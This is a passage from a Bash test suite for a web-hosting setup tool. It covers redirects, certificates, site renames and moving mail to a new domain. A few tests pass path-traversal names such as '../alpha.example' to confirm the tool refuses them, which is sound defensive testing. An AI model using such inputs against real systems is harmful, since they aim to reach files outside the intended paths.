assert_lacks "--no-ssl asks for no certificate" "obtain" "$(_rn_calls)"
: >"$_rn/calls"
_rn_case _rn_sync alpha.example
assert_lacks "nothing changed for the target: its redirects are left alone" "commit" "$(_rn_calls)"
jq '.ssl.enabled = false' "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
_rn_case _rn_sync alpha.example
assert_has "the target lost its certificate: the redirect follows" "commit pending=1 redirect old.example" "$(_rn_calls)"
assert_has "to http" 'RewriteRule ^(.*)$ http://alpha.example$1 [R=301,L]' "$(cat "$_rn/lsws/conf/vhosts/old.example/vhconf.conf")"
: >"$_rn/calls"
_rn_case lib_redirect_save other.example elsewhere.example 0
_rn_case _rn_sync alpha.example
assert_lacks "a redirect to another name is not touched by it" "other.example" "$(_rn_calls)$(ls "$_rn/lsws/conf/vhosts")"
assert_has  "applying a site's configuration is what makes them follow" "lib_redirect_sync_target" "$(sed -n '/^lib_domain_apply_config() {/,/^}/p' "$ROOT/lib/domain.sh")"

# ---- redirect add: the certificate ----------------------------------------------------
_rn_fresh
: >"$_rn/calls"
_rn_case _rn_redirect add old.example alpha.example --www
assert_has "no certificate could be had: it still redirects" "rc=0" "$(_rn_out)"
assert_has "and says so" "No certificate for old.example: certbot said no" "$(_rn_out)"
assert_has "with the command that tries again" "setup.sh redirect add old.example alpha.example --www" "$(_rn_out)"
assert_has "it asked for both names under the name's own lineage" "obtain old.example old.example www.old.example" "$(_rn_calls)"
printf 1 >"$_rn/dns-rc"; : >"$_rn/calls"
_rn_case _rn_redirect add old.example alpha.example --www
assert_lacks "DNS that points elsewhere: certbot is not asked" "obtain" "$(_rn_calls)"
assert_has "and that is the reason given" "its DNS does not point to this server" "$(_rn_out)"
rm -f "$_rn/dns-rc"; : >"$_rn/certbot-works"; : >"$_rn/calls"
_rn_case _rn_redirect add old.example alpha.example --www
assert_has "with a certificate the virtual host gets it" "keyFile" "$(cat "$_rn/lsws/conf/vhosts/old.example/vhconf.conf")"
assert_has "and says HTTPS too" "(HTTPS too)" "$(_rn_out)"
printf 'old.example\nwww.old.example\n' >"$_rn/covers-old.example"; : >"$_rn/calls"
_rn_case _rn_redirect add old.example alpha.example --www
assert_lacks "a certificate that covers the names is not asked for again" "obtain" "$(_rn_calls)"
printf 'old.example\n' >"$_rn/covers-old.example"; : >"$_rn/calls"
_rn_case _rn_redirect add old.example alpha.example --www
assert_has "one that lacks www is" "obtain old.example old.example www.old.example" "$(_rn_calls)"
assert_eq  "and OpenLiteSpeed is reloaded though no file changed: the certificate did" "pending=0 pending=1" "$(_rn_calls | grep '^commit' | awk '{print $2}' | tr '\n' ' ' | sed 's/ $//')"

# ---- redirect add / del: what is refused ----------------------------------------------
_rn_fresh
_rn_case _rn_redirect add alpha.example new.example;   assert_has "a site cannot be made a redirect" "alpha.example is a site of this server" "$(_rn_out)"
assert_has   "rename is what moves it" "setup.sh rename alpha.example new.example" "$(_rn_out)"
assert_false "and it was not"  test -e "$_rn/state/domains/alpha.example/redirect.json"
_rn_case _rn_redirect add old.example old.example;     assert_has "not to itself" "cannot redirect to itself" "$(_rn_out)"
_rn_case _rn_redirect add old.example www.old.example; assert_has "nor to its own www" "cannot redirect to itself" "$(_rn_out)"
_rn_case _rn_redirect add www.old.example alpha.example; assert_has "a www name is --www" "redirect add old.example alpha.example --www" "$(_rn_out)"
_rn_case _rn_redirect add ../alpha.example new.example; assert_has "a path is no name" "Invalid domain name" "$(_rn_out)"
_rn_case _rn_redirect add old.example http://x.example; assert_has "nor is an address a target" "Invalid domain name" "$(_rn_out)"
_rn_case _rn_redirect add old.example;                  assert_has "two names are needed" "Two names are needed" "$(_rn_out)"
_rn_case _rn_redirect add old.example alpha.example --bogus; assert_has "an unknown option is refused" "Unknown option for redirect add" "$(_rn_out)"
assert_false "none of these left a record" test -e "$_rn/state/domains/old.example"
_rn_case _rn_redirect add old.example alpha.example --no-ssl
_rn_case _rn_redirect add third.example old.example --no-ssl; assert_has "a redirect to a redirect is refused" "itself only a redirect" "$(_rn_out)"
_rn_case _rn_redirect list
assert_has "list shows where it leads" "https://alpha.example" "$(_rn_out)"
assert_has "and what leads there" "old.example" "$(_rn_out)"
_rn_case _rn_redirect del ../domains/alpha.example;     assert_has "del takes a name, not a path" "Invalid domain name" "$(_rn_out)"
_rn_case _rn_redirect del alpha.example;                assert_has "a site is no redirect to delete" "No redirect called alpha.example" "$(_rn_out)"
assert_true  "the site's state is untouched" test -s "$_rn/state/domains/alpha.example/domain.json"
assert_true  "and its certificate" test -s "$_rn/ssl/alpha.example/fullchain.pem"
mkdir -p "$_rn/ssl/old.example"; printf c >"$_rn/ssl/old.example/fullchain.pem"; printf 'x\n' >"$_rn/state/domains/old.example/ssl.info"
_rn_case _rn_redirect del old.example
assert_has   "redirect del succeeds" "rc=0" "$(_rn_out)"
assert_false "its state directory is gone" test -e "$_rn/state/domains/old.example"
assert_false "its virtual host directory" test -e "$_rn/lsws/conf/vhosts/old.example"
assert_lacks "its virtual host" "virtualhost old.example" "$(cat "$_rn/lsws/conf/httpd_config.conf")"
assert_lacks "its listener maps" "old.example" "$(cat "$_rn/lsws/conf/httpd_config.conf")"
assert_false "and its certificate" test -e "$_rn/ssl/old.example"
_rn_case _rn_redirect add old.example alpha.example --no-ssl
mkdir -p "$_rn/ssl/old.example"; printf c >"$_rn/ssl/old.example/fullchain.pem"
_rn_case _rn_redirect del old.example --keep-ssl
assert_true  "--keep-ssl keeps the certificate" test -s "$_rn/ssl/old.example/fullchain.pem"

# ---- the name is taken ----------------------------------------------------------------
_rn_fresh
_rn_case lib_redirect_save old.example alpha.example 0
_rn_case lib_domain_add_main old.example --no-ssl
assert_has   "add refuses a name that redirects" "old.example only redirects to alpha.example" "$(_rn_out)"
assert_has   "and says how to free it" "setup.sh redirect del old.example" "$(_rn_out)"
assert_false "no site was started under it" test -e "$_rn/home/old.example"
assert_false "nor a state file" test -e "$_rn/state/domains/old.example/domain.json"
assert_true  "the redirect is still there" test -s "$_rn/state/domains/old.example/redirect.json"
assert_has   "restore refuses it the same way" 'lib_redirect_exists "$domain"' "$(sed -n '/^lib_restore_main() {/,/^}/p' "$ROOT/lib/backup.sh")"
_rn_case _rn_doctor
_o="$(_rn_out)"
assert_lacks "doctor does not call a redirect's virtual host unmanaged" "unmanaged vhost old.example" "$_o"
assert_has   "one that belongs to nothing still is" "WARN|unmanaged vhost stray.example" "$_o"
assert_has   "the redirect is checked for the 301 it is there for" "OK|redirect old.example|sends its visitors on to https://alpha.example" "$_o"
assert_has   "and for the certificate it lacks" "WARN|redirect old.example: ssl" "$_o"
printf 403 >"$_rn/http-code"
_rn_case _rn_doctor
assert_has   "any other answer is a failure" "FAIL|redirect old.example|HTTP 403 instead of a 301" "$(_rn_out)"
_rn_case lib_redirect_save gone.example alpha.example 0
_rn_case _rn_doctor
assert_has   "and so is one whose virtual host is missing" "FAIL|redirect gone.example|virtualhost block missing" "$(_rn_out)"
: >"$_rn/calls"
_rn_case _rn_ssl
_o="$(_rn_out)"
assert_has   "ssl status lists the redirects" "Redirects" "$_o"
assert_has   "as having none" "none" "$(grep '^  old.example' <<<"$_o")"
# the site without its certificate and the renewal nothing runs are the problems; the two
# redirects without one are warnings: they still redirect, over HTTP
assert_has   "which is a warning, not a failure" "2 problem(s), 2 warning(s)" "$_o"
assert_has   "with the command that fetches it" " redirect add old.example alpha.example    # once its DNS points here" "$_o"
assert_has   "the certificate is looked up under the name itself" "old.example old.example" "$(_rn_calls)"
_rn_case lib_redirect_save old.example alpha.example 1
: >"$_rn/calls"; printf 'FAIL|3|1|renewal is not getting through' >"$_rn/lineage"
_rn_case _rn_ssl
assert_has   "with www it has to cover www" "old.example old.example www.old.example" "$(_rn_calls)"
assert_has   "one that does not renew is a failure" "4 problem(s), 0 warning(s)" "$(_rn_out)"
assert_has   "and the command takes www along" " redirect add old.example alpha.example --www    # once" "$(_rn_out)"
rm -f "$_rn/lineage"
_rn_case lib_redirect_save old.example alpha.example 0
_rn_case lib_domain_list_main
assert_has   "list shows the redirect below the sites" "-> alpha.example" "$(_rn_out)"
assert_has   "as what it is" "redirect" "$(_rn_out | grep '^old.example')"

# ---- rename: what stands in the way ---------------------------------------------------
_rn_fresh
_rn_case _rn_blocker alpha.example beta.example
assert_eq "nothing in the way: nothing is said" "rc=0" "$(_rn_out)"
_rn_site gamma.example gamma_example
_rn_case _rn_blocker alpha.example gamma.example;  assert_has "a site of that name" "gamma.example is a site of this server already" "$(_rn_out)"
_rn_case lib_redirect_save red.example alpha.example 0
_rn_case _rn_blocker alpha.example red.example;    assert_has "a redirect of that name" "red.example only redirects to alpha.example" "$(_rn_out)"
mkdir -p "$_rn/home/left.example"
_rn_case _rn_blocker alpha.example left.example;   assert_has "a home left behind under that name" "$_rn/home/left.example is in the way" "$(_rn_out)"
mkdir -p "$_rn/sitelogs/logs.example"
_rn_case _rn_blocker alpha.example logs.example;   assert_has "a log directory" "$_rn/sitelogs/logs.example is in the way" "$(_rn_out)"
mkdir -p "$_rn/lsws/conf/vhosts/vh.example"
_rn_case _rn_blocker alpha.example vh.example;     assert_has "a virtual host directory" "conf/vhosts/vh.example is in the way" "$(_rn_out)"
mkdir -p "$_rn/state/domains/st.example"
_rn_case _rn_blocker alpha.example st.example;     assert_has "a state directory" "state/domains/st.example is in the way" "$(_rn_out)"
printf 'beta_example\n' >>"$_rn/users"
_rn_case _rn_blocker alpha.example beta.example;   assert_has "a Linux user of the new name" "a Linux user called beta_example exists already" "$(_rn_out)"
sed -i '/^beta_example$/d' "$_rn/users"; printf 'beta_example\n' >>"$_rn/groups"
_rn_case _rn_blocker alpha.example beta.example;   assert_has "or a group" "a Linux group called beta_example exists already" "$(_rn_out)"
sed -i '/^beta_example$/d' "$_rn/groups"
# two long names can share the 28 characters a user name is cut to: then no user changes
_rn_long="averyveryveryverylongdomainname"
_rn_site "${_rn_long}.example" "$(lib_domain_ident "${_rn_long}.example")"
_rn_case _rn_blocker "${_rn_long}.example" "${_rn_long}.exampleb"; assert_eq "a new name with the same user name is not blocked by that user" "rc=0" "$(_rn_out)"
jq '.app = {port: 3000}' "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
_rn_case _rn_blocker alpha.example beta.example;   assert_eq  "a Node.js application is no reason to refuse" "rc=0" "$(_rn_out)"
: >"$_rn/mail-installed"; : >"$_rn/mail-traces-alpha.example"
_rn_case _rn_blocker alpha.example beta.example;   assert_eq  "nor is mail that belongs to the site" "rc=0" "$(_rn_out)"
jq 'del(.app)' "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
rm -f "$_rn"/mail-*
jq '.user = "someone"' "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
_rn_case _rn_blocker alpha.example beta.example;   assert_has "a site that runs as another user than its own" "runs as someone:alpha_example" "$(_rn_out)"
# A record that names another site's account. A restore that was refused used to leave one
# behind, and with a directory of its name in place - files uploaded for the site the list
# shows - it is a site to every test above. Renaming "its" user would take the account, and
# whatever runs as it, away from the site it belongs to.
_rn_fresh
_rn_site b-c.example b_c_example
mkdir -p "$_rn/state/domains/b.c.example" "$_rn/home/b.c.example/public_html" "$_rn/backups/b.c.example"
jq -n --arg h "$_rn/home/b.c.example" '{domain:"b.c.example", ident:"b_c_example", user:"b_c_example", group:"b_c_example", home:$h, mode:"static", status:"restoring", www:false, ssl:{enabled:false, wanted:false}}' \
  >"$_rn/state/domains/b.c.example/domain.json"
_rn_case _rn_blocker b-c.example new.example;      assert_eq  "a site whose account lives in its home is renamed like any other" "rc=0" "$(_rn_out)"
_rn_case _rn_blocker b.c.example new.example
assert_has   "a record that names another site's account is no site to rename" "it is on record as running as b_c_example" "$(_rn_out)"
assert_has   "it says where that account lives" "that account's home is $_rn/home/b-c.example: another site's" "$(_rn_out)"
assert_has   "and what such a record is for" "setup.sh remove b.c.example puts such a record away" "$(_rn_out)"
: >"$_rn/calls"
_rn_case _rn_rename b.c.example new.example --no-ssl
assert_has   "the command stops on it" "b.c.example cannot be renamed to new.example" "$(_rn_out)"
assert_lacks "nobody was renamed" "usermod" "$(_rn_calls)"
assert_lacks "no group either" "groupmod" "$(_rn_calls)"
assert_lacks "and nothing was taken off the air" "purge" "$(_rn_calls)"
assert_eq    "the account is still the other site's, where it was" "b_c_example:$_rn/home/b-c.example" "$(grep '^b_c_example:' "$_rn/passwd")"
assert_false "nothing was made under the new name" test -e "$_rn/state/domains/new.example"

# ---- rename: the arguments ------------------------------------------------------------
_rn_fresh
_rn_site gamma.example gamma_example
_rn_before="$(_rn_tree)"
_rn_case _rn_rename alpha.example gamma.example
assert_has "what stands in the way stops the command" "alpha.example cannot be renamed to gamma.example" "$(_rn_out)"
assert_has "with the reason" "gamma.example is a site of this server already" "$(_rn_out)"
_rn_case _rn_rename alpha.example;                    assert_has "two names are needed" "Two names are needed" "$(_rn_out)"
_rn_case _rn_rename alpha.example alpha.example;      assert_has "not to its own name" "is called that already" "$(_rn_out)"
_rn_case _rn_rename alpha.example www.beta.example;   assert_has "not to a www name" "Use the bare name instead of www.beta.example" "$(_rn_out)"
_rn_case _rn_rename alpha.example ../beta.example;    assert_has "not to a path" "Invalid domain name" "$(_rn_out)"
_rn_case _rn_rename ../alpha.example beta.example;    assert_has "not from a path" "Invalid domain name" "$(_rn_out)"
_rn_case _rn_rename nosuch.example beta.example;      assert_has "not a site that is not there" "Site nosuch.example is not registered" "$(_rn_out)"
_rn_case _rn_rename alpha.example beta.example --bogus; assert_has "an unknown option is refused" "Unknown option for rename" "$(_rn_out)"
_rn_case _rn_rename --help;                           assert_has "help is help" "Usage: setup.sh rename" "$(_rn_out)"
_rn_case _rn_rename_asked alpha.example beta.example; assert_has "without a yes nothing happens" "Rename cancelled" "$(_rn_out)"
_rn_case _rn_rename_dry alpha.example beta.example
assert_has "a dry run says what would happen" "becomes $_rn/home/beta.example" "$(_rn_out)"
assert_has "and that nothing did" "nothing was changed" "$(_rn_out)"
: >"$_rn/backup-fails"
_rn_case _rn_rename alpha.example beta.example;       assert_has "no safety backup, no rename" "The safety backup failed, so nothing was changed" "$(_rn_out)"
rm -f "$_rn/backup-fails"
assert_eq    "after all of these the site is where it was" "$_rn_before" "$(_rn_tree)"
assert_lacks "and nobody was renamed" "usermod" "$(_rn_calls)"
assert_lacks "nor taken off the air" "purge" "$(_rn_calls)"

# ---- rename: the move -----------------------------------------------------------------
_rn_fresh
printf '<?php // wp\n' >"$_rn/home/alpha.example/public_html/wp-config.php"
printf "define('X', '%s/home/alpha.example/public_html/x');\n" "$_rn" >>"$_rn/home/alpha.example/public_html/wp-config.php"
printf 'WP_URL=https://alpha.example\nWP_PATH=%s/home/alpha.example/public_html\n' "$_rn" >"$_rn/state/domains/alpha.example/wp.info"
printf 1 >"$_rn/dns-rc"
_rn_case lib_redirect_save early.example alpha.example 1
_rn_case _rn_rename alpha.example beta.example
_o="$(_rn_out)"; _c="$(_rn_calls)"
assert_has   "the rename succeeds" "rc=0" "$_o"
assert_has   "and says so" "Renamed alpha.example to beta.example" "$_o"
assert_has   "DNS that is not here yet is said before anything moves" "The DNS of beta.example does not point to this server yet" "$_o"
assert_true  "the home has the new name" test -s "$_rn/home/beta.example/public_html/index.php"
assert_false "and not the old one" test -e "$_rn/home/alpha.example"
assert_true  "the logs moved, history included" test -s "$_rn/sitelogs/beta.example/access.log"
assert_false "none stay behind" test -e "$_rn/sitelogs/alpha.example"
assert_eq    "the state says who the site is now" "beta.example beta_example beta_example beta_example $_rn/home/beta.example" "$(_rn_json beta.example '"\(.domain) \(.ident) \(.user) \(.group) \(.home)"')"
assert_eq    "and where it came from" "alpha.example" "$(_rn_json beta.example '.renamed_from')"
assert_eq    "the certificate was the old name's" "false null null" "$(_rn_json beta.example '"\(.ssl.enabled) \(.ssl.expires) \(.ssl.cert_name)"')"
assert_eq    "it still wants one" "true" "$(_rn_json beta.example '.ssl.wanted')"
assert_eq    "everything else is kept: the database" "alpha_db alpha_user" "$(_rn_json beta.example '"\(.db.name) \(.db.user)"')"
assert_eq    "the PHP settings and the hardening" "8.3 256M blocked true" "$(_rn_json beta.example '"\(.php.version) \(.php.memory_limit) \(.security.php_exec) \(.www)"')"
assert_true  "the database login moved with the state" grep -q '^DB_PASS=secret$' "$_rn/state/domains/beta.example/db.info"
assert_false "the old certificate's note did not" test -e "$_rn/state/domains/beta.example/ssl.info"
assert_has   "the group is renamed" "groupmod -n beta_example alpha_example" "$_c"
assert_has   "the user is renamed" "usermod -l beta_example alpha_example" "$_c"
assert_has   "and pointed at the new home" "usermod -d $_rn/home/beta.example -c site beta.example beta_example" "$_c"
assert_eq    "the virtual host goes before the user is renamed, the new one comes after" "in order" \
  "$(awk '/^purge alpha.example/{p=NR} /^usermod -l/{u=NR} /^apply beta.example/{a=NR} END{ if (p && u && a && p < u && u < a) print "in order"; else print p, u, a }' "$_rn/calls")"
assert_has   "a safety backup comes first" "backup alpha.example --tag pre-rename --keep 0 --no-mail" "$(head -n 1 "$_rn/calls")"
assert_has   "the new virtual host is rendered for the new user in the new home, without HTTPS yet" "apply beta.example user=beta_example home=$_rn/home/beta.example ssl=0" "$_c"
assert_has   "the site is asked whether it answers" "smoke beta.example" "$_c"
assert_has   "a certificate is asked for under the new name" "add-ssl beta.example" "$_c"
assert_false "PHP's ini directory of the old name is gone" test -e "$_rn/phpini/alpha.example"
assert_has   "logs/ in the home is linked again" "logs-link $_rn/home/beta.example" "$_c"
assert_has   "logrotate is told" "logrotate" "$_c"
# the old name
assert_eq    "the old name is a redirect to the new one, www as the site had it" "beta.example true" "$(jq -r '"\(.target) \(.www)"' "$_rn/state/domains/alpha.example/redirect.json")"
assert_eq    "and nothing else" "redirect.json" "$(ls "$_rn/state/domains/alpha.example" | tr '\n' ' ' | sed 's/ $//')"
assert_has   "its virtual host is applied" "redirect-apply alpha.example" "$_c"
assert_true  "it keeps its certificate" test -s "$_rn/ssl/alpha.example/fullchain.pem"
assert_lacks "which nobody deletes" "ssl-delete" "$_c"
assert_true  "the redirect is in place before the certificate is asked for" bash -c 'r="$(grep -n "^redirect-apply alpha.example" "$1" | cut -d: -f1)"; s="$(grep -n "^add-ssl" "$1" | cut -d: -f1)"; [ "$r" -lt "$s" ]' _ "$_rn/calls"
assert_eq    "a name that led to the old one now leads to the new one" "beta.example true" "$(jq -r '"\(.target) \(.www)"' "$_rn/state/domains/early.example/redirect.json")"
assert_has   "and is applied" "redirect-apply early.example" "$_c"
# what still said the old name
assert_has   "WordPress: addresses, www first" "search-replace //www.alpha.example //www.beta.example --all-tables-with-prefix --skip-columns=guid" "$_c"
assert_has   "the bare name" "search-replace //alpha.example //beta.example " "$_c"
assert_has   "the form JSON keeps them in" 'search-replace \/\/alpha.example \/\/beta.example ' "$_c"
assert_has   "and the home directory" "search-replace $_rn/home/alpha.example/ $_rn/home/beta.example/ " "$_c"
assert_true  "the www form is rewritten before the bare one" bash -c 'w="$(grep -n "search-replace //www.alpha" "$1" | cut -d: -f1)"; b="$(grep -n "search-replace //alpha" "$1" | cut -d: -f1)"; [ "$w" -lt "$b" ]' _ "$_rn/calls"
assert_lacks "never the bare word: a mail address stays" "search-replace alpha.example" "$_c"
assert_has   "it runs as the renamed user" "-u beta_example -- env HOME=$_rn/home/beta.example" "$(grep 'search-replace' "$_rn/runuser.log" | tail -n 1)"
assert_eq    "the note with the admin login follows" "WP_URL=https://beta.example WP_PATH=$_rn/home/beta.example/public_html" "$(tr '\n' ' ' <"$_rn/state/domains/beta.example/wp.info" | sed 's/ $//')"
assert_has   "the scheduled events run as the new user in the new home" "beta_example cd $_rn/home/beta.example/public_html" "$(grep 'wpcron:beta.example' "$_rn/cron")"
assert_lacks "and no line is left for the old name" "alpha.example" "$(cat "$_rn/cron")"
assert_true  "the archives follow the site, the safety one among them" test -e "$_rn/backups/beta.example/alpha.example-pre-rename-20260101-000000.tar.gz"
assert_false "none stay under the old name" test -e "$_rn/backups/alpha.example"
assert_has   "a file that still names the old home is pointed out" "$_rn/home/beta.example/public_html/wp-config.php" "$_o"
assert_has   "the certificate that is still missing is said at the end" "No certificate yet: point the DNS of beta.example here" "$_o"

# ---- rename: the options --------------------------------------------------------------
_rn_fresh
printf '<?php // wp\n' >"$_rn/home/alpha.example/public_html/wp-config.php"
_rn_case _rn_rename alpha.example beta.example --no-redirect --no-ssl --no-search-replace
_c="$(_rn_calls)"
assert_has   "it succeeds" "rc=0" "$(_rn_out)"
assert_false "--no-redirect: the old name leaves no record" test -e "$_rn/state/domains/alpha.example"
assert_has   "and its certificate goes" "ssl-delete alpha.example" "$_c"
assert_lacks "no redirect is applied" "redirect-apply" "$_c"
assert_lacks "--no-ssl: no certificate is asked for" "add-ssl" "$_c"
assert_lacks "--no-search-replace: the database is left alone" "search-replace" "$_c"
_rn_fresh
jq '.ssl.wanted = false | .ssl.enabled = false | .www = false' "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
printf '<?php // wp\n' >"$_rn/home/alpha.example/public_html/wp-config.php"
_rn_case _rn_rename alpha.example beta.example
_c="$(_rn_calls)"
assert_lacks "a site that wanted no certificate is not given one" "add-ssl" "$_c"
assert_has   "without www, the www form goes to the bare name" "search-replace //www.alpha.example //beta.example " "$_c"
assert_eq    "and the redirect takes no www along" "false" "$(jq -r .www "$_rn/state/domains/alpha.example/redirect.json")"

# ---- rename: a site with mail ---------------------------------------------------------
# A mailbox is an address at the old domain. It stays one: the old name becomes a mail domain
# of its own, with the site's .mail block as it was, and the site moves on without mail.
_rn_mail_site() {
  _rn_fresh
  jq '.mail = {enabled: true, selector: "s2026", webmail: true, ident: "alpha_example", selectors_used: ["s2025", "s2026"]}' \
    "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
  : >"$_rn/mail-installed"; : >"$_rn/mail-traces-alpha.example"
}
_rn_mail_site
_rn_case _rn_rename_dry alpha.example beta.example --keep-mail
assert_has   "--keep-mail: it is said beforehand that the mail stays" "stays at @alpha.example" "$(_rn_out)"
assert_false "a dry run registers nothing" test -e "$_rn/maildomains"
_rn_case _rn_rename alpha.example beta.example --keep-mail
_o="$(_rn_out)"
assert_has   "a site with mail is renamed" "rc=0" "$_o"
assert_lacks "--keep-mail: mail is not switched on for the new name" "mail-enable" "$(_rn_calls)"
assert_eq    "the old name is a mail domain of its own, with everything its mail had" "alpha.example mail true s2026 true alpha_example s2025,s2026" \
  "$(jq -r '"\(.domain) \(.kind) \(.mail.enabled) \(.mail.selector) \(.mail.webmail) \(.mail.ident) \(.mail.selectors_used | join(","))"' "$_rn/maildomains/alpha.example/domain.json")"
assert_eq    "the site under its new name has no mail" "false" "$(_rn_json beta.example 'has("mail")')"
assert_eq    "and is still everything else" "beta.example alpha_db" "$(_rn_json beta.example '"\(.domain) \(.db.name)"')"
assert_true  "the archives stay under the old name: the mail's are among them" test -e "$_rn/backups/alpha.example/alpha.example-20260101-000000.tar.gz"
assert_has   "the safety backup leaves the mail out: nothing happens to it" "--no-mail" "$(_rn_calls | head -n 1)"
assert_has   "it is said afterwards" "alpha.example is a mail domain of its own now" "$_o"
assert_has   "with how the new name gets mail" "setup.sh mail enable beta.example" "$_o"
if (( CAN_CHMOD )); then
  assert_eq  "the record is root's alone" "600" "$(stat -c %a "$_rn/maildomains/alpha.example/domain.json")"
fi
# a record of its own was there all along: that one counts, and is not written over
_rn_mail_site
mkdir -p "$_rn/maildomains/alpha.example"; printf '{"domain":"alpha.example","kind":"mail","mail":{"enabled":true,"selector":"own"}}\n' >"$_rn/maildomains/alpha.example/domain.json"
_rn_case _rn_rename alpha.example beta.example
assert_lacks "mail that was never the site's does not move with it" "mail-enable" "$(_rn_calls)"
assert_eq    "a mail domain that had its own record keeps it" "own" "$(jq -r .mail.selector "$_rn/maildomains/alpha.example/domain.json")"
assert_eq    "and the site's stale block goes" "false" "$(_rn_json beta.example 'has("mail")')"
# mail that was switched off and left nothing behind
_rn_fresh
jq '.mail = {enabled: false}' "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
_rn_case _rn_rename alpha.example beta.example
assert_false "mail that left no trace makes no mail domain" test -e "$_rn/maildomains/alpha.example"
assert_eq    "the block does not follow the site either" "false" "$(_rn_json beta.example 'has("mail")')"
assert_lacks "and nothing is said about mail" "mail domain of its own" "$(_rn_out)"
# a rename that is undone leaves the mail the site's
_rn_mail_site
: >"$_rn/smoke-fails"
_rn_case _rn_rename alpha.example beta.example
assert_has   "a failed rename of a site with mail rolls back" "Rolling back" "$(_rn_out)"
assert_eq    "its mail is still the site's" "true s2026" "$(_rn_json alpha.example '"\(.mail.enabled) \(.mail.selector)"')"
assert_false "and no mail domain was made" test -e "$_rn/maildomains/alpha.example"

# ---- rename: the mailboxes follow the site --------------------------------------------
# Unless --keep-mail: every mailbox to the new domain with its mail, its password hash and its
# quota, every alias with its targets; at the old domain one alias per address is left.
_rn_mail_boxes() {
  _rn_mail_site
  mkdir -p "$_rn/mail/aliases" "$_rn/vmail/alpha.example/info/Maildir/new" "$_rn/vmail/alpha.example/sales/Maildir/cur"
  printf 'a message\n' >"$_rn/vmail/alpha.example/info/Maildir/new/m1"
  printf '%s\n' 'info@alpha.example:{H}infohash::::::userdb_quota_rule=*:storage=2G' 'other@gamma.example:{H}otherhash::::::userdb_quota_rule=*:storage=1G' \
    'sales@alpha.example:{H}saleshash::::::userdb_quota_rule=*:storage=1G' >"$_rn/mail/passwd"
  printf 'postmaster@alpha.example\tinfo@alpha.example\nteam@alpha.example\tinfo@alpha.example,sales@alpha.example,boss@elsewhere.example\n@alpha.example\tinfo@alpha.example\n' >"$_rn/mail/aliases/alpha.example"
}
_rn_alias() { awk -F'\t' -v k="$2" '$1 == k { print $2 }' "$_rn/mail/aliases/$1" 2>/dev/null || true; }
_rn_mail_boxes
_rn_case _rn_rename_dry alpha.example beta.example
assert_has   "it is said beforehand that the mailboxes move" "every mailbox moves to @beta.example" "$(_rn_out)"
printf 'info@alpha.example\n' >"$_rn/wm-users"
_rn_case _rn_rename alpha.example beta.example
_o="$(_rn_out)"; _c="$(_rn_calls)"; _p="$(cat "$_rn/mail/passwd")"
assert_has   "the rename succeeds" "rc=0" "$_o"
assert_has   "mail is switched on for the new name" "mail-enable beta.example --yes" "$_c"
assert_has   "a mailbox is one of the new domain now, with its password hash and its quota" 'info@beta.example:{H}infohash::::::userdb_quota_rule=*:storage=2G' "$_p"
assert_has   "each of them" 'sales@beta.example:{H}saleshash::::::userdb_quota_rule=*:storage=1G' "$_p"
assert_lacks "none is left a mailbox of the old domain" "@alpha.example:" "$_p"
assert_has   "another domain's mailbox is not touched" 'other@gamma.example:{H}otherhash::::::userdb_quota_rule=*:storage=1G' "$_p"
assert_true  "its mail moved with it" test -s "$_rn/vmail/beta.example/info/Maildir/new/m1"
assert_false "and is not left behind" test -e "$_rn/vmail/alpha.example/info"
assert_has   "open sessions under the old address are closed first" "doveadm kick info@alpha.example" "$_c"
assert_eq    "the old address is an alias of the new one" "info@beta.example" "$(_rn_alias alpha.example info@alpha.example)"
assert_eq    "every one" "sales@beta.example" "$(_rn_alias alpha.example sales@alpha.example)"
assert_eq    "an alias exists at the new domain, its targets named there; one elsewhere is left alone" "info@beta.example,sales@beta.example,boss@elsewhere.example" "$(_rn_alias beta.example team@beta.example)"
assert_eq    "and the old alias leads to it" "team@beta.example" "$(_rn_alias alpha.example team@alpha.example)"
assert_eq    "postmaster too" "info@beta.example postmaster@beta.example" "$(_rn_alias beta.example postmaster@beta.example) $(_rn_alias alpha.example postmaster@alpha.example)"
assert_eq    "a catch-all is one at both, into the mailbox where it is now" "info@beta.example info@beta.example" "$(_rn_alias beta.example @beta.example) $(_rn_alias alpha.example @alpha.example)"
assert_eq    "the old domain is still a mail domain: it has to take the mail it forwards" "true s2026" "$(jq -r '"\(.mail.enabled) \(.mail.selector)"' "$_rn/maildomains/alpha.example/domain.json")"
assert_eq    "the new one has mail" "true" "$(_rn_json beta.example '.mail.enabled')"
# never without a home: the tables are rebuilt while the old addresses are still mailboxes too,
# and their lines go only after that
assert_has   "the tables are rebuilt with both names of a mailbox there" "info@alpha.example info@beta.example" "$(grep '^mail-tables' "$_rn/calls" | head -n 1)"
assert_lacks "and again once the old lines are gone" "@alpha.example" "$(grep '^mail-tables' "$_rn/calls" | tail -n 1)"
assert_eq    "twice in all" 2 "$(grep -c '^mail-tables' "$_rn/calls")"
assert_true  "after the certificate: it is the last thing that takes time" bash -c 'm="$(grep -n "^mail-enable" "$1" | cut -d: -f1)"; s="$(grep -n "^add-ssl" "$1" | cut -d: -f1)"; [ "$s" -lt "$m" ]' _ "$_rn/calls"
assert_has   "the webmail the old domain had is set up for the new one" "webmail-enable beta.example" "$_c"
assert_has   "what the webmail kept for a mailbox follows its new name" "SET username = 'info@beta.example' WHERE LOWER(username) = 'info@alpha.example'" "$_c"
assert_lacks "a mailbox that never signed in there has nothing to rename" "sales@beta.example' WHERE" "$_c"
assert_has   "it is said where the mail is now" "Mail: now at @beta.example - info@beta.example, sales@beta.example" "$_o"
assert_has   "and what the new domain's DNS needs" "setup.sh mail dns beta.example" "$_o"
assert_has   "it is a step of its own" "Mailboxes to @beta.example" "$_o"
# a mailbox whose new address is taken stays where it is, and so does what points at it
_rn_mail_boxes
